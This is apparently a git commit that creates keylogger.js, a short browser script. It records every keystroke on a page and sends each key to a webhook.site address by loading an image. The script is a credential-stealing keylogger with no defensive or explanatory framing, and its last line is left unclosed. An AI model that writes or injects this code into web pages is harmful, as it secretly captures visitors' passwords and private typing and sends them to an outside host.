c4fc68f3a17026fe987b1619973f21ec8e971869
Abdul Wassay <57496383+hotplugin0x01@users.noreply.github.com>
2024-07-12 16:44:19 +0500

    Create keylogger.js

---
+++ keylogger.js
@@ -0,0 +1,4 @@
+document.addEventListener('keydown', function (event){
+    var key = event.key;
+    var img = new Image().src = 'https://webhook.site/9dc7264d-4455-46aa-83e8-2083096f8b57/?key='+key;
+}, false
